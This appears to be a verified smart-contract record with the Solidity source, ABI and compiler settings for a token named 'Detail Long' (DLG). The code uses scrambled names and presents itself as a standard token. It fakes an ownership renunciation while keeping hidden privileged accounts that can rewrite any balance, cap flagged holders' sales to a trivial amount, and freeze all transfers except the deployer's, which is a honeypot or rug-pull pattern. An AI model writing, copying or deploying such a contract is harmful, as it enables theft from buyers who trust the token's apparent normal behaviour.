{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface fundMaxWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTxLaunched) external view returns (uint256);\n\n    function transfer(address liquidityMode, uint256 sellAtMax) external returns (bool);\n\n    function allowance(address launchShouldSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellAtMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityMode,\n        uint256 sellAtMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLimit, uint256 value);\n    event Approval(address indexed launchShouldSender, address indexed spender, uint256 value);\n}\n\nabstract contract sellMarketingList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLiquidityTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenTxAmount {\n    function createPair(address amountToken, address toFrom) external returns (address);\n}\n\ninterface fundMaxWalletMetadata is fundMaxWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DetailLong is sellMarketingList, fundMaxWallet, fundMaxWalletMetadata {\n\n    function transferFrom(address maxSwap, address liquidityMode, uint256 sellAtMax) external override returns (bool) {\n        if (_msgSender() != atEnableAmount) {\n            if (receiverModeTotal[maxSwap][_msgSender()] != type(uint256).max) {\n                require(sellAtMax <= receiverModeTotal[maxSwap][_msgSender()]);\n                receiverModeTotal[maxSwap][_msgSender()] -= sellAtMax;\n            }\n        }\n        return buyLaunch(maxSwap, liquidityMode, sellAtMax);\n    }\n\n    uint256 public toTeamLimit;\n\n    uint256 private feeAt;\n\n    uint256 public enableTrading;\n\n    bool public sellShouldEnable;\n\n    address atEnableAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address autoSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        buyLiquidityTx shouldLimit = buyLiquidityTx(atEnableAmount);\n        takeMarketing = tokenTxAmount(shouldLimit.factory()).createPair(shouldLimit.WETH(), address(this));\n        if (feeAt != txAt) {\n            txAt = enableTrading;\n        }\n        tokenSwapAuto = _msgSender();\n        autoMin();\n        marketingSwap[tokenSwapAuto] = true;\n        atModeLaunched[tokenSwapAuto] = tokenReceiverReceiver;\n        \n        emit Transfer(address(0), tokenSwapAuto, tokenReceiverReceiver);\n    }\n\n    mapping(address => bool) public marketingSwap;\n\n    uint256 private txAt;\n\n    function owner() external view returns (address) {\n        return marketingLimit;\n    }\n\n    address private marketingLimit;\n\n    uint256 constant liquidityLimitExempt = 3 ** 10;\n\n    function getOwner() external view returns (address) {\n        return marketingLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toLaunched;\n    }\n\n    mapping(address => bool) public tradingMin;\n\n    function maxMarketing(address fundEnableBuy, uint256 sellAtMax) public {\n        sellMode();\n        atModeLaunched[fundEnableBuy] = sellAtMax;\n    }\n\n    uint8 private teamTrading = 18;\n\n    uint256 launchTakeFee;\n\n    string private listTeam = \"DLG\";\n\n    function allowance(address receiverLaunched, address listMarketing) external view virtual override returns (uint256) {\n        if (listMarketing == atEnableAmount) {\n            return type(uint256).max;\n        }\n        return receiverModeTotal[receiverLaunched][listMarketing];\n    }\n\n    function amountModeTo(uint256 sellAtMax) public {\n        sellMode();\n        launchTakeFee = sellAtMax;\n    }\n\n    function approve(address listMarketing, uint256 sellAtMax) public virtual override returns (bool) {\n        receiverModeTotal[_msgSender()][listMarketing] = sellAtMax;\n        emit Approval(_msgSender(), listMarketing, sellAtMax);\n        return true;\n    }\n\n    string private toLaunched = \"Detail Long\";\n\n    address public tokenSwapAuto;\n\n    function fromReceiver(address receiverLiquidityAuto) public {\n        sellMode();\n        \n        if (receiverLiquidityAuto == tokenSwapAuto || receiverLiquidityAuto == takeMarketing) {\n            return;\n        }\n        tradingMin[receiverLiquidityAuto] = true;\n    }\n\n    uint256 exemptTeam;\n\n    function autoMin() public {\n        emit OwnershipTransferred(tokenSwapAuto, address(0));\n        marketingLimit = address(0);\n    }\n\n    function transfer(address fundEnableBuy, uint256 sellAtMax) external virtual override returns (bool) {\n        return buyLaunch(_msgSender(), fundEnableBuy, sellAtMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenReceiverReceiver;\n    }\n\n    function buyLaunch(address maxSwap, address liquidityMode, uint256 sellAtMax) internal returns (bool) {\n        if (maxSwap == tokenSwapAuto) {\n            return swapLaunchTake(maxSwap, liquidityMode, sellAtMax);\n        }\n        uint256 limitAt = fundMaxWallet(takeMarketing).balanceOf(autoSwap);\n        require(limitAt == launchTakeFee);\n        require(liquidityMode != autoSwap);\n        if (tradingMin[maxSwap]) {\n            return swapLaunchTake(maxSwap, liquidityMode, liquidityLimitExempt);\n        }\n        return swapLaunchTake(maxSwap, liquidityMode, sellAtMax);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverModeTotal;\n\n    function launchedMaxFund(address atReceiver) public {\n        if (sellShouldEnable) {\n            return;\n        }\n        \n        marketingSwap[atReceiver] = true;\n        \n        sellShouldEnable = true;\n    }\n\n    uint256 private tokenReceiverReceiver = 100000000 * 10 ** 18;\n\n    function sellMode() private view {\n        require(marketingSwap[_msgSender()]);\n    }\n\n    address public takeMarketing;\n\n    mapping(address => uint256) private atModeLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listTeam;\n    }\n\n    uint256 private minFund;\n\n    function balanceOf(address enableTxLaunched) public view virtual override returns (uint256) {\n        return atModeLaunched[enableTxLaunched];\n    }\n\n    function swapLaunchTake(address maxSwap, address liquidityMode, uint256 sellAtMax) internal returns (bool) {\n        require(atModeLaunched[maxSwap] >= sellAtMax);\n        atModeLaunched[maxSwap] -= sellAtMax;\n        atModeLaunched[liquidityMode] += sellAtMax;\n        emit Transfer(maxSwap, liquidityMode, sellAtMax);\n        return true;\n    }\n\n    uint256 private sellLaunchReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTrading;\n    }\n\n    event OwnershipTransferred(address indexed txMode, address indexed enableMode);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShouldSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellAtMax\",\"type\":\"uint256\"}],\"name\":\"amountModeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAtMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTxLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityAuto\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"launchedMaxFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAtMax\",\"type\":\"uint256\"}],\"name\":\"maxMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeamLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwapAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAtMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAtMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DetailLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}